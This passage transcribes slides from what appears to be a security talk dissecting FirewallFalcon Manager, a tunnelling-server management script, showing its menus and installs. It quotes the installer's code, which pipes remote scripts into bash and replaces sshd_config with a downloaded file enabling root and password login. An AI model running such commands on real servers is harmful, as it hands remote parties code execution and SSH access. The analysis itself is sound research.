═══════════[ 🌐 VPN & PROTOCOLS ]═══════════
 [ 9] Protocol Manager           [11] Traffic Monitor (Lite)
 [10] DT Proxy Manager           [12] Block Torrent (Anti-P2P)

═══════════[ ⚙️SYSTEM SETTINGS ]═══════════
 [13] CloudFlare Free Domain     [16] Backup User Data
 [14] SSH Banner Config          [17] Restore User Data
 [15] Auto-Reboot Task           [18] Cleanup Expired Users

═══════════[ 🔥 DANGER ZONE ]═══════════
 [99] Uninstall Script                   [ 0] Exit

👉 Select an option: ▊
```

## Slide 51

**LET’S PLAY**

```text
FirewallFalcon Manager | v3.5.0 Premium Edition
─────────────────────────────────────────────────────────
OS         Ubuntu 24.04.3 LTS   | Uptime: 6 hours, 42 minutes
Memory     22.70% Used          | Online Sessions: 0
Users      1 Managed Accounts   | Sys Load (1m): 0.02
─────────────────────────────────────────────────────────
✅ User 'test_user' created successfully!

 - 👤 Username:          test_user
 - 🔑 Password:          123456
 - 📝Expires on:         2026-02-12
 - 📊 Connection Limit:
   (Active monitoring service will enforce this limit)

👉 Do you want to generate a client connection config for this user? (y/n): ▊
```

The `Connection Limit:` line is printed with no value after it.

## Slide 52

**LET’S PLAY**

```text
[👉 Do you want to generate a client connection config for this user? (y/n): y

--- 📱 Client Connection Configuration ---
Copy the details below to your clipboard:

=========================================
👤 User Details
  • Username: test_user
  • Password: 123456
  • Host/IP : ███████████
=========================================

🔷 SSH Direct:
  • Host: ███████████
  • Port: 22
  • payload: (Standard SSH)
=========================================

Press [Enter] to return to the menu...
▊
```

Both host values are blurred out on the slide.

## Slide 53

**LET’S PLAY**

The same main menu as the previous LET’S PLAY slide, but the blue arrow now points at the `[ 9] Protocol Manager` line.

```text
FirewallFalcon Manager | v3.5.0 Premium Edition
─────────────────────────────────────────────────────────
OS         Ubuntu 24.04.3 LTS   | Uptime: 6 hours, 41 minutes
Memory     22.60% Used          | Online Sessions: 0
Users      0 Managed Accounts   | Sys Load (1m): 0.03
─────────────────────────────────────────────────────────

═══════════[ 👤 USER MANAGEMENT ]═══════════
 [ 1] Create New User            [ 5] Unlock User Account
 [ 2] Delete User                [ 6] Edit User Details
 [ 3] Renew User Account         [ 7] List Managed Users
 [ 4] Lock User Account          [ 8] Generate Client Config

═══════════[ 🌐 VPN & PROTOCOLS ]═══════════
 [ 9] Protocol Manager           [11] Traffic Monitor (Lite)
 [10] DT Proxy Manager           [12] Block Torrent (Anti-P2P)

═══════════[ ⚙️SYSTEM SETTINGS ]═══════════
 [13] CloudFlare Free Domain     [16] Backup User Data
 [14] SSH Banner Config          [17] Restore User Data
 [15] Auto-Reboot Task           [18] Cleanup Expired Users

═══════════[ 🔥 DANGER ZONE ]═══════════
 [99] Uninstall Script                   [ 0] Exit

👉 Select an option: ▊
```

## Slide 54

**LET’S PLAY**

```text
FirewallFalcon Manager | v3.5.0 Premium Edition
─────────────────────────────────────────────────────────
OS         Ubuntu 24.04.3 LTS   | Uptime: 6 hours, 43 minutes
Memory     22.59% Used          | Online Sessions: 0
Users      1 Managed Accounts   | Sys Load (1m): 0.00
─────────────────────────────────────────────────────────


══════════[ 🔌 PROTOCOL & PANEL MANAGEMENT ]══════════
   --- TUNNELLING PROTOCOLS---
  [ 1] 🚀 Install badvpn (UDP 7300)               (Inactive)
  [ 2] 🗑️Uninstall badvpn
  [ 3] 🚀 Install udp-custom                      (Inactive)
  [ 4] 🗑️Uninstall udp-custom
  [ 5] 🔒 Install SSL Tunnel (Port 444)           (Inactive)
  [ 6] 🗑️Uninstall SSL Tunnel
  [ 7] 📡 Install/View DNSTT (Port 53)            (Inactive)
  [ 8] 🗑️Uninstall DNSTT
  [ 9] 🦅 Install Falcon Proxy (Select Version)   (Inactive)
  [10] 🗑️Uninstall Falcon Proxy
  [11] 🌐 Install/Manage Nginx Proxy (80/443)     (Inactive)
  [16] 🛡️Install ZiVPN (UDP 5667)             (Inactive)
  [17] 🗑️Uninstall ZiVPN
   --- 💻 MANAGEMENT PANELS ---
  [12] 💻 Install X-UI Panel                      (Not Installed)
  [13] 🗑️Uninstall X-UI Panel
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  [ 0] ↩️Return to Main Menu

👉 Select an option: ▊
```

## Slide 55

**LET’S PLAY**

The same protocol menu, with a blue arrow pointing from the left of the slide at the `[ 5] 🔒 Install SSL Tunnel (Port 444)` line.

```text
FirewallFalcon Manager | v3.5.0 Premium Edition
─────────────────────────────────────────────────────────
OS         Ubuntu 24.04.3 LTS   | Uptime: 6 hours, 43 minutes
Memory     22.59% Used          | Online Sessions: 0
Users      1 Managed Accounts   | Sys Load (1m): 0.00
─────────────────────────────────────────────────────────


══════════[ 🔌 PROTOCOL & PANEL MANAGEMENT ]══════════
   --- TUNNELLING PROTOCOLS---
  [ 1] 🚀 Install badvpn (UDP 7300)               (Inactive)
  [ 2] 🗑️Uninstall badvpn
  [ 3] 🚀 Install udp-custom                      (Inactive)
  [ 4] 🗑️Uninstall udp-custom
  [ 5] 🔒 Install SSL Tunnel (Port 444)           (Inactive)
  [ 6] 🗑️Uninstall SSL Tunnel
  [ 7] 📡 Install/View DNSTT (Port 53)            (Inactive)
  [ 8] 🗑️Uninstall DNSTT
  [ 9] 🦅 Install Falcon Proxy (Select Version)   (Inactive)
  [10] 🗑️Uninstall Falcon Proxy
  [11] 🌐 Install/Manage Nginx Proxy (80/443)     (Inactive)
  [16] 🛡️Install ZiVPN (UDP 5667)             (Inactive)
  [17] 🗑️Uninstall ZiVPN
   --- 💻 MANAGEMENT PANELS ---
  [12] 💻 Install X-UI Panel                      (Not Installed)
  [13] 🗑️Uninstall X-UI Panel
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  [ 0] ↩️Return to Main Menu

👉 Select an option: ▊
```

## Slide 56

**LET’S PLAY**

```text
🔎 Checking if port 444 is available...
✅ Port 444 is free to use.
ℹ️No active firewall (UFW or firewalld) detected. Assuming ports are open.

🔐 Generating self-signed SSL certificate...
✅ Certificate created: /etc/firewallfalcon/ssl/firewallfalcon.pem

📝 Creating HAProxy configuration for port 444...

▶️Reloading and starting HAProxy service...

✅ SUCCESS: SSL Tunnel is active.
Clients can now connect to this server's IP on port 444 using an SSL/TLS tunnel.

Press [Enter] to return to the menu...
▊
```

## Slide 57

**LET’S PLAY**

The same protocol menu, with a blue arrow pointing from the left of the slide at the `[ 7] 📡 Install/View DNSTT (Port 53)` line.

```text
FirewallFalcon Manager | v3.5.0 Premium Edition
─────────────────────────────────────────────────────────
OS         Ubuntu 24.04.3 LTS   | Uptime: 6 hours, 43 minutes
Memory     22.59% Used          | Online Sessions: 0
Users      1 Managed Accounts   | Sys Load (1m): 0.00
─────────────────────────────────────────────────────────


══════════[ 🔌 PROTOCOL & PANEL MANAGEMENT ]══════════
   --- TUNNELLING PROTOCOLS---
  [ 1] 🚀 Install badvpn (UDP 7300)               (Inactive)
  [ 2] 🗑️Uninstall badvpn
  [ 3] 🚀 Install udp-custom                      (Inactive)
  [ 4] 🗑️Uninstall udp-custom
  [ 5] 🔒 Install SSL Tunnel (Port 444)           (Inactive)
  [ 6] 🗑️Uninstall SSL Tunnel
  [ 7] 📡 Install/View DNSTT (Port 53)            (Inactive)
  [ 8] 🗑️Uninstall DNSTT
  [ 9] 🦅 Install Falcon Proxy (Select Version)   (Inactive)
  [10] 🗑️Uninstall Falcon Proxy
  [11] 🌐 Install/Manage Nginx Proxy (80/443)     (Inactive)
  [16] 🛡️Install ZiVPN (UDP 5667)             (Inactive)
  [17] 🗑️Uninstall ZiVPN
   --- 💻 MANAGEMENT PANELS ---
  [12] 💻 Install X-UI Panel                      (Not Installed)
  [13] 🗑️Uninstall X-UI Panel
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  [ 0] ↩️Return to Main Menu

👉 Select an option: ▊
```

## Slide 58

**LET’S PLAY**

```text
FirewallFalcon Manager | v3.5.0 Premium Edition
─────────────────────────────────────────────────────────
OS         Ubuntu 24.04.3 LTS   | Uptime: 6 hours, 50 minutes
Memory     23.86% Used          | Online Sessions: 0
Users      1 Managed Accounts   | Sys Load (1m): 0.02
─────────────────────────────────────────────────────────
--- 📡 DNSTT (DNS Tunnel) Management ---
⚙️Forcing release of Port 53 (stopping systemd-resolved)...

🔎 Checking if port 53 (UDP) is available...
✅ Port 53 (UDP) is free to use.
ℹ️No active firewall (UFW or firewalld) detected. Assuming ports are open.

Please choose where DNSTT should forward traffic:
  [ 1] ➡️Forward to local SSH service (port 22)
  [ 2] ➡️Forward to local V2Ray backend (port 8787)
👉 Enter your choice [2]: ▊
```

## Slide 59

**LET’S PLAY**

```text
==========================================================
             📡 DNSTT Connection Details
==========================================================

Your connection details:
  - Tunnel Domain: tun-███████.manager.firewallfalcon.qzz.io
  - Public Key: ████████████████████████████████████████
  - Forwarding To: V2Ray (port 8787)
  - Action Required: Ensure a V2Ray service (vless/vmess/trojan) listens on port 8787 (no TLS)

Use these details in your client configuration.
```

The random label in the tunnel domain and the whole public key are blurred out on the slide.

## Slide 60

**LET’S PLAY**

The same protocol menu, with a blue arrow pointing from the left of the slide at the `[12] 💻 Install X-UI Panel` line.

```text
FirewallFalcon Manager | v3.5.0 Premium Edition
─────────────────────────────────────────────────────────
OS         Ubuntu 24.04.3 LTS   | Uptime: 6 hours, 43 minutes
Memory     22.59% Used          | Online Sessions: 0
Users      1 Managed Accounts   | Sys Load (1m): 0.00
─────────────────────────────────────────────────────────


══════════[ 🔌 PROTOCOL & PANEL MANAGEMENT ]══════════
   --- TUNNELLING PROTOCOLS---
  [ 1] 🚀 Install badvpn (UDP 7300)               (Inactive)
  [ 2] 🗑️Uninstall badvpn
  [ 3] 🚀 Install udp-custom                      (Inactive)
  [ 4] 🗑️Uninstall udp-custom
  [ 5] 🔒 Install SSL Tunnel (Port 444)           (Inactive)
  [ 6] 🗑️Uninstall SSL Tunnel
  [ 7] 📡 Install/View DNSTT (Port 53)            (Inactive)
  [ 8] 🗑️Uninstall DNSTT
  [ 9] 🦅 Install Falcon Proxy (Select Version)   (Inactive)
  [10] 🗑️Uninstall Falcon Proxy
  [11] 🌐 Install/Manage Nginx Proxy (80/443)     (Inactive)
  [16] 🛡️Install ZiVPN (UDP 5667)             (Inactive)
  [17] 🗑️Uninstall ZiVPN
   --- 💻 MANAGEMENT PANELS ---
  [12] 💻 Install X-UI Panel                      (Not Installed)
  [13] 🗑️Uninstall X-UI Panel
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  [ 0] ↩️Return to Main Menu

👉 Select an option: ▊
```

## Slide 61

**LET’S PLAY**

```text
WebBasePath: ███████
##############################################
If you forgot your login info, you can type 'x-ui settings' to check
Start migrating database...
Migration done!
Created symlink /etc/systemd/system/multi-user.target.wants/x-ui.service →
x-ui v1.10.1 installation finished, it is up and running now...

You may access the Panel with following URL(s):
Local address:
████████████████████████████

Global address:
████████████████████████████

X-UI Control Menu Usage
----------------------------------------------
SUBCOMMANDS:
x-ui              - Admin Management Script
x-ui start        - Start
x-ui stop         - Stop
x-ui restart      - Restart
x-ui status       - Current Status
x-ui settings     - Current Settings
x-ui enable       - Enable Autostart on OS Startup
x-ui disable      - Disable Autostart on OS Startup
x-ui log          - Check Logs
x-ui update       - Update
x-ui install      - Install
x-ui uninstall    - Uninstall
x-ui help         - Control Menu Usage
----------------------------------------------

Press [Enter] to return to the menu...
▊
```

The `WebBasePath` value and both panel addresses are blurred out on the slide.

## Slide 62

**LET’S PLAY**

A screenshot of the panel's login page: the heading **Welcome**, a username field pre-filled with `user1`, a masked password field (six dots) with a show-password eye, a blue **Log In** button, a language selector reading **English** with a US flag, and a light/dark toggle beneath. Both input fields carry a small red autofill badge.

Caption below the screenshot:

Tool’s UI – available on http://IP_ADDRESS:43237/<<Random_String>>

## Slide 63

A full-page screenshot of the X-UI panel's Overview page; the slide carries no title of its own.

Sidebar: **Overview** (selected), Inbounds, Panel Settings, Xray Configs, Log Out, with a light/dark toggle above.

Banner:

> ⊗ **Security Alert**
> This connection is not secure. Please avoid entering sensitive information until TLS is activated for data protection.

Four ring gauges:

| Gauge | Reading | Label |
|---|---|---|
| CPU | 0.25% | **CPU:** 2 Cores |
| RAM | 23.85% | **RAM:** 1.85 GB / 7.75 GB |
| Swap | 0% | **Swap:** 0 B / 0 B |
| Disk | 5.77% | **Disk:** 4.42 GB / 76.45 GB |

Cards below, left column then right column:

- **Version:** X-UI 1.10.1 · Xray 26.2.6
- **Xray:** Running · Stop · Restart
- **System Load:** 0.05 | 0.23 | 0.13
- **Server:** FlareResearch · IPv4
- ↑ **Up:** 304 B/s   ↓ **Down:** 463 B/s

- **Uptime:** Xray 2m · OS 7h
- **Manage:** Logs · Config · Backup & Restore
- **Usage:** RAM 22.08 MB · Threads 15
- ⇆ **TCP:** 22   ⇆ **UDP:** 8
- ⬆ **Out:** 301.89 MB   ⬇ **In:** 1.01 GB

## Slide 64

**LET’S PLAY**

The main menu again, with a blue arrow pointing from the left of the slide at the `[10] DT Proxy Manager` line.

```text
FirewallFalcon Manager | v3.5.0 Premium Edition
─────────────────────────────────────────────────────────
OS         Ubuntu 24.04.3 LTS   | Uptime: 11 hours, 54 minutes
Memory     5.78% Used           | Online Sessions: 0
Users      0 Managed Accounts   | Sys Load (1m): 0.01
─────────────────────────────────────────────────────────

═══════════[ 👤 USER MANAGEMENT ]═══════════
 [ 1] Create New User            [ 5] Unlock User Account
 [ 2] Delete User                [ 6] Edit User Details
 [ 3] Renew User Account         [ 7] List Managed Users
 [ 4] Lock User Account          [ 8] Generate Client Config

═══════════[ 🌐 VPN & PROTOCOLS ]═══════════
 [ 9] Protocol Manager           [11] Traffic Monitor (Lite)
 [10] DT Proxy Manager           [12] Block Torrent (Anti-P2P)

═══════════[ ⚙️SYSTEM SETTINGS ]═══════════
 [13] CloudFlare Free Domain     [16] Backup User Data
 [14] SSH Banner Config          [17] Restore User Data
 [15] Auto-Reboot Task           [18] Cleanup Expired Users

═══════════[ 🔥 DANGER ZONE ]═══════════
 [99] Uninstall Script                   [ 0] Exit

👉 Select an option: ▊
```

## Slide 65

**LET’S PLAY**

A blue arrow points from the left of the slide at the `[ 1] 🚀 Install DT Tunnel (Mod + Proxy)` line.

```text
FirewallFalcon Manager | v3.5.0 Premium Edition
─────────────────────────────────────────────────────────
OS         Ubuntu 24.04.3 LTS   | Uptime: 11 hours, 59 minutes
Memory     7.95% Used           | Online Sessions: 0
Users      0 Managed Accounts   | Sys Load (1m): 0.28
─────────────────────────────────────────────────────────


═════════════[ 🚀 DT Proxy Management (Installed) ]═════════════
  [ 1] 🚀 Install DT Tunnel (Mod + Proxy)
  [ 2] ▶️Launch DT Tunnel Management Menu
  [ 3] 🗑️Uninstall DT Tunnel (Mod + Proxy)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  [ 0] ↩️Return to Main Menu

👉 Select an option: ▊
```

## Slide 66

**LET’S PLAY**

```text
┌──────────────────────────────┐
│      DTunnel Proxy Menu      │
├──────────────────────────────┤
│ [01] ● OPEN PORT             │
│ [02] ● CLOSE PORT            │
│ [03] ● RESTART PORT          │
│ [04] ● VIEW PORT LOGS        │
│ [00] ● EXIT                  │
└──────────────────────────────┘
[👉 Enter your choice: 1
[👉 Port: 4
[👉 🔐 Enable SSL? (y/n) [n]: y
[👉 📄 Use internal certificate? (y/n) [y]: y
[👉 Default HTTP response [FirewallFalcon]: facebook.com
[👉 🔒 Enable SSH-only mode? (y/n) [n]: y
Created symlink /etc/systemd/system/multi-user.target.wants/proxy-4.service → /etc/systemd/system/proxy-4.service.
✅ Proxy started on port 4.
👉 Press Enter to continue...▊
```

## Slide 67

**WHAT IS DTUNNEL?**

Left — a browser window at `dtunnel.com.br/login`:

**DTUNNEL**

# Total control, premium interface.

Access your exclusive control panel to manage tunnels, monitor connections, and configure integrations through an elegant and easy-to-use interface.

Right — the **DTunnel** YouTube channel:

@dtunnel • 343 subscribers • 9 videos
More about this channel ...more
[Subscribe]

Tabs: Home · Videos · Shorts · Live

**Shorts** — one thumbnail: "Descrição do uso da permissão …", 189 views

**Videos**

| Title | Length | Views | Age |
|---|---|---|---|
| DTUNNEL PROTOCOLO COM SUPORTE A XHTTP | 9:39 | 895 views | 3 months ago |
| Ativando função no Dtunnel - Modo avião automático | 1:37 | 979 views | 2 years ago |
| DTunnel - GERANDO APLICATIVO | 1:13 | 979 views | 2 years ago |
| DTUNNEL - COMO ALTERAR AS CREDENCIAIS (USER_ID) | 1:42 | 1K views | 2 years ago |
| TUTORIAL V2RAY DTUNNEL | 3:23 | 2K views | 2 years ago |
| DTUNNEL - IMPORTAR CONFIGURAÇÃO | 1:05 | 2.5K views | 2 years ago |

## Slide 68

**DTUNNEL REGISTRATION**

A screenshot of the panel's sign-up form:

**Create account**

Fill in your details to access the new panel.

- **First name** — blurred out
- **Last name** — blurred out
- **Email** — blurred local part, then `@gmail.com`
- **Password** — masked
- **Confirm password** — masked

Button: **Register**

Already have an account? **Sign in**

## Slide 69

A full-page screenshot of the **DTunnel Control Center**; the slide carries no title of its own.

Sidebar: DT DTunnel / Control Center — Home, Settings, App, Texts, **Renew** (selected), Transactions, Notifications, Devices, Sessions, Profile. At the foot: "Active session" over a blurred value, and **Sign out**. Top right: a translate icon, a theme icon, and a blurred account chip.

# Renew

Choose a plan, apply a coupon if you want, and generate the renewal payment via PIX or card.

Four RENEWAL PLAN cards, each marked **Available**:

| Plan | Term | Final amount | Base price | Applied discount |
|---|---|---|---|---|
| Plano Mensal | Renewal for 01 meses — 01 MESES | R$35.00 | R$35.00 | R$0.00 |
| Plano Trimestral | Renewal for 03 meses — 03 MESES | R$90.00 | R$90.00 | R$0.00 |
| Vitalício | Renewal for 2739 anos — 2739 ANOS | R$250.00 | R$250.00 | R$0.00 |
| Plano Anual | Renewal for 01 ano — 01 ANO | R$199.90 | R$199.90 | R$0.00 |

Each card then repeats:

Payment method — PIX · Card
Choose a payment method to continue.
Discount coupon — "Enter a discou…" [Apply]
**Renew now**

## Slide 70

**I’M FALLING IN LOVE**

A cartoon of two Care-Bear-style bears sitting side by side, hearts for eyes, surrounded by floating pink hearts. The pink bear's belly badge is two red hearts; the blue bear's is a smiling cloud with a rainbow.

## Slide 71

**The FirewallFalcon Journey**

The treasure map again, unchanged except that the red "YOU ARE HERE" arrow has moved on: it now points down at **PIRATES AHEAD**, the third stop.

A compass rose (N, W, E, S) sits at the top left; the title banner reads "The FirewallFalcon Journey" above a skull and crossbones. The dashed trail runs left to right through **DISCOVERY** (magnifying glass), **DEEP DIVE** (diving helmet), **PIRATES AHEAD** (pirate flag) and ends at a red X over a treasure chest, captioned on a scroll: "X MARKS THE SPOT".

## Slide 72

**FOUR INTERESTING ELEMENTS IN THE TOOL**

Four icons in a row, with no captions of their own:

1. A terminal tile reading `>_ SSH`.
2. A dark circular badge showing a shield inside a tunnel — the DTunnel mark.
3. The FIREWALL FALCONS falcon logo.
4. A globe outline captioned **DNS**.

## Slide 73

**REMEMBER THIS ONE…**

The install transcript from the VM-lab slide, with four lines ringed in red by hand and a red arrow pointing at the ring from the right: `Installing FirewallFalcon Manager...`, `Applying FirewallFalcon SSH configuration...`, `SSH configuration validated.` and `SSH service restarted.`

```text
[root@ip-172-31-32-128:~# curl -L -o install.sh "https://raw.githubusercontent.com/firewallfalcons/FirewallFalcon-Manager]
/main/install.sh" && chmod +x install.sh && sudo ./install.sh && rm install.sh
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2124  100  2124    0     0  13355      0 --:--:-- --:--:-- --:--:-- 13443
sudo: unable to resolve host ip-172-31-32-128: Name or service not known
Installing FirewallFalcon Manager...
Applying FirewallFalcon SSH configuration...
SSH configuration validated.
SSH service restarted.
⚙️Initializing FirewallFalcon Manager setup...
🔷 Configuring user limiter service...
✅ Setup finished.
Installation complete!
Type 'menu' to start.
root@ip-172-31-32-128:~# ▊
```

## Slide 74

**CHECKING UNDER THE HOOD**

A GitHub mark sits in the top-right corner. To the right of the listing, in large type: **I know it’s too small don’t worry**

```bash
echo "Installing FirewallFalcon Manager..."

# URLs (IPv4 forced to avoid GitHub IPv6 issues)
MENU_URL="https://raw.githubusercontent.com/firewallfalcons/FirewallFalcon-Manager/main/menu.sh"
SSHD_URL="https://raw.githubusercontent.com/firewallfalcons/FirewallFalcon-Manager/main/ssh"

# Install menu
wget -4 -q -O /usr/local/bin/menu "$MENU_URL"
chmod +x /usr/local/bin/menu

echo "Applying FirewallFalcon SSH configuration..."

SSHD_CONFIG="/etc/ssh/sshd_config"
BACKUP="/etc/ssh/sshd_config.backup.$(date +%F-%H%M%S)"

# Backup current SSH config
cp "$SSHD_CONFIG" "$BACKUP"

# Download FirewallFalcon SSH config
wget -4 -q -O "$SSHD_CONFIG" "$SSHD_URL"
chmod 600 "$SSHD_CONFIG"

# Validate SSH config (silent)
if ! sshd -t 2>/dev/null; then
    echo "ERROR: SSH configuration is invalid!"
    echo "Restoring previous configuration..."
    cp "$BACKUP" "$SSHD_CONFIG"
    exit 1
fi

echo "SSH configuration validated."
```

## Slide 75

**CHECKING UNDER THE HOOD**

The same listing, blurred, with one line enlarged in a callout panel:

```bash
echo "Installing FirewallFalcon Manager..."
```

## Slide 76

**CHECKING UNDER THE HOOD**

The same listing, blurred, with two callout panels stacked over it:

```bash
echo "Installing FirewallFalcon Manager..."
```

```bash
SSHD_URL="https://raw.githubusercontent.com/firewallfalcons/FirewallFalcon-Manager/main/ssh"
```

## Slide 77

**CHECKING UNDER THE HOOD**

The same listing, blurred, with three callout panels stacked over it:

```bash
echo "Installing FirewallFalcon Manager..."
```

```bash
SSHD_URL="https://raw.githubusercontent.com/firewallfalcons/FirewallFalcon-Manager/main/ssh"
```

```bash
# Download FirewallFalcon SSH config
wget -4 -q -O "$SSHD_CONFIG" "$SSHD_URL"
chmod 600 "$SSHD_CONFIG"
```

## Slide 78

**CHECKING UNDER THE HOOD**

The same listing, blurred, with four callout panels stacked over it:

```bash
echo "Installing FirewallFalcon Manager..."
```

```bash
SSHD_URL="https://raw.githubusercontent.com/firewallfalcons/FirewallFalcon-Manager/main/ssh"
```

```bash
# Download FirewallFalcon SSH config
wget -4 -q -O "$SSHD_CONFIG" "$SSHD_URL"
chmod 600 "$SSHD_CONFIG"
```

```bash
SSHD_CONFIG="/etc/ssh/sshd_config"
BACKUP="/etc/ssh/sshd_config.backup.$(date +%F-%H%M%S)"
```

## Slide 79

**CHECKING UNDER THE HOOD**

The same listing, blurred, with five callout panels stacked over it:

```bash
echo "Installing FirewallFalcon Manager..."
```

```bash
SSHD_URL="https://raw.githubusercontent.com/firewallfalcons/FirewallFalcon-Manager/main/ssh"
```

```bash
# Download FirewallFalcon SSH config
wget -4 -q -O "$SSHD_CONFIG" "$SSHD_URL"
chmod 600 "$SSHD_CONFIG"
```

```bash
SSHD_CONFIG="/etc/ssh/sshd_config"
BACKUP="/etc/ssh/sshd_config.backup.$(date +%F-%H%M%S)"
```

```bash
if ! sshd -t 2>/dev/null; then
    echo "ERROR: SSH configuration is invalid!"
    echo "Restoring previous configuration..."
    cp "$BACKUP" "$SSHD_CONFIG"
    exit 1
```

The fifth panel is cut off at the bottom edge of the slide after `exit 1`.

## Slide 80

**CHECKING UNDER THE HOOD**

To the right of the screenshot, in blue: **→ "/etc/ssh/sshd_config"**

A browser window at `codeberg.org/firewallfalcons/FirewallFalcon-Manager/raw/branch/main/ssh`:

```text
# FIREWALLFALCON
#
Port 22
Protocol 2
KeyRegenerationInterval 3600
ServerKeyBits 1024
SyslogFacility AUTH
LogLevel INFO
LoginGraceTime 120
PermitRootLogin yes
StrictModes yes
RSAAuthentication yes
PubkeyAuthentication yes
IgnoreRhosts yes
RhostsRSAAuthentication no
HostbasedAuthentication no
PermitEmptyPasswords no
PermitTunnel yes
ChallengeResponseAuthentication no
PasswordAuthentication yes
X11Forwarding yes
X11DisplayOffset 10
PrintMotd no
PrintLastLog yes
TCPKeepAlive yes
#UseLogin no
AcceptEnv LANG LC_*
Subsystem sftp /usr/lib/openssh/sftp-server
UsePAM yes
Banner /etc/bannerssh
```

Two lines are ringed in red by hand: `PermitRootLogin yes` and `PasswordAuthentication yes`.

## Slide 81

**BUT, OPENING SSH TO THE INTERNET IS PART OF THE TOOL…**

## Slide 82

**FOUR INTERESTING ELEMENTS IN THE TOOL**

The same four icons as before — a `>_ SSH` terminal tile, the dark DTunnel tunnel-and-shield badge, the FIREWALL FALCONS falcon logo and a globe captioned **DNS** — with a green check mark added above the SSH tile.

## Slide 83

**REMEMBER THIS ONE…**

The DTunnel proxy transcript again, with the `DTunnel Proxy Menu` title line ringed in red by hand and a red arrow pointing at the ring from the right.

```text
┌──────────────────────────────┐
│      DTunnel Proxy Menu      │
├──────────────────────────────┤
│ [01] ● OPEN PORT             │
│ [02] ● CLOSE PORT            │
│ [03] ● RESTART PORT          │
│ [04] ● VIEW PORT LOGS        │
│ [00] ● EXIT                  │
└──────────────────────────────┘
[👉 Enter your choice: 1
[👉 Port: 4
[👉 🔐 Enable SSL? (y/n) [n]: y
[👉 📄 Use internal certificate? (y/n) [y]: y
[👉 Default HTTP response [FirewallFalcon]: facebook.com
[👉 🔒 Enable SSH-only mode? (y/n) [n]: y
Created symlink /etc/systemd/system/multi-user.target.wants/proxy-4.service → /etc/systemd/system/proxy-4.service.
✅ Proxy started on port 4.
👉 Press Enter to continue...▊
```

## Slide 84

**CHECKING UNDER THE HOOD**

The caption **I know it’s too small don’t worry** appears twice, once to the left of the listing and once to the right. A GitHub mark sits in the top-right corner. The listing carries gutter line numbers 2316–2346.

```bash
install_dt_proxy_full() {
    clear; show_banner
    echo -e "${C_BOLD}${C_PURPLE}--- 🚀 Full DT Tunnel Installation ---${C_RESET}"
    if [ -f "/usr/local/bin/main" ]; then
        echo -e "\n${C_YELLOW}ℹ️ DT Proxy appears to be already installed.${C_RESET}"
        echo -e "If you wish to reinstall, please uninstall it first."
        return
    fi

    echo -e "\n${C_BLUE}--- Step 1 of 2: Installing DT Tunnel Mod ---${C_RESET}"
    echo "This will download and run the prerequisite mod installer."
    read -p "👉 Press [Enter] to continue or [Ctrl+C] to cancel."

    if curl -sL https://raw.githubusercontent.com/firewallfalcons/ProxyMods/main/install.sh | bash; then
        echo -e "\n${C_GREEN}✅ DT Tunnel Mod installed successfully.${C_RESET}"
    else
        echo -e "\n${C_RED}❌ ERROR: DT Tunnel Mod installation failed. Aborting.${C_RESET}"
        return
    fi

    echo -e "\n${C_BLUE}--- Step 2 of 2: Installing DT Tunnel Proxy ---${C_RESET}"
    echo "This will download and run the main DT Tunnel proxy installer."
    read -p "👉 Press [Enter] to continue or [Ctrl+C] to cancel."

    if bash <(curl -fsSL https://raw.githubusercontent.com/firewallfalcons/ProxyDT-Go-Releases/main/install.sh); then
        echo -e "\n${C_GREEN}✅ DT Tunnel Proxy installed successfully.${C_RESET}"
        echo -e "You can now manage it from the DT Proxy Management menu."
    else
        echo -e "\n${C_RED}❌ ERROR: DT Tunnel Proxy installation failed.${C_RESET}"
    fi
}
```

## Slide 85

**CHECKING UNDER THE HOOD**

The `install_dt_proxy_full()` listing from the previous slide, blurred, with one callout panel over it:

```bash
if curl -sL https://raw.githubusercontent.com/firewallfalcons/ProxyMods/main/install.sh | bash; then
    echo -e "\n${C_GREEN}✅ DT Tunnel Mod installed successfully.${C_RESET}"
else
```

(the panel's third line, `else`, is clipped by the panel's bottom edge)

## Slide 86

**CHECKING UNDER THE HOOD**

A GitHub mark sits in the top-right corner. The listing carries gutter line numbers 1–27.

```bash
#!/bin/bash
set -e

echo "firewallfalcon" > "$HOME/.proxy_token"

URL_X86_64="https://github.com/firewallfalcons/ProxyMods/raw/refs/heads/main/install_mod"
URL_ARM64="https://github.com/firewallfalcons/ProxyMods/raw/refs/heads/main/Arminstall_mod"
FILENAME="install_mod"

echo "⚙️  Detecting your server's architecture..."
ARCH=$(uname -m)

case $ARCH in
    x86_64)
        echo "✅  Detected x86_64 (Intel/AMD 64-bit)."
        DOWNLOAD_URL="$URL_X86_64"
        ;;
    aarch64)
        echo "✅  Detected aarch64 (ARM 64-bit)."
        DOWNLOAD_URL="$URL_ARM64"
        ;;
    *)
        echo "❌  Unsupported architecture: $ARCH"
        echo "This installer only supports x86_64 and aarch64."
        exit 1
        ;;
esac
```

## Slide 87

**CHECKING UNDER THE HOOD**

The same listing, with two regions ringed in red by hand, each with a red arrow pointing at it from the right: the `echo "firewallfalcon" > "$HOME/.proxy_token"` line (line 4), and the two `URL_X86_64=` / `URL_ARM64=` lines (lines 6–7).

```bash
#!/bin/bash
set -e

echo "firewallfalcon" > "$HOME/.proxy_token"

URL_X86_64="https://github.com/firewallfalcons/ProxyMods/raw/refs/heads/main/install_mod"
URL_ARM64="https://github.com/firewallfalcons/ProxyMods/raw/refs/heads/main/Arminstall_mod"
FILENAME="install_mod"

echo "⚙️  Detecting your server's architecture..."
ARCH=$(uname -m)

case $ARCH in
    x86_64)
        echo "✅  Detected x86_64 (Intel/AMD 64-bit)."
        DOWNLOAD_URL="$URL_X86_64"
        ;;
    aarch64)
        echo "✅  Detected aarch64 (ARM 64-bit)."
        DOWNLOAD_URL="$URL_ARM64"
        ;;
    *)
        echo "❌  Unsupported architecture: $ARCH"
        echo "This installer only supports x86_64 and aarch64."
        exit 1
        ;;
esac
```

## Slide 88

**CHECKING UNDER THE HOOD**

The caption **I know it’s too small don’t worry** appears twice, once to the left of the terminal and once to the right.

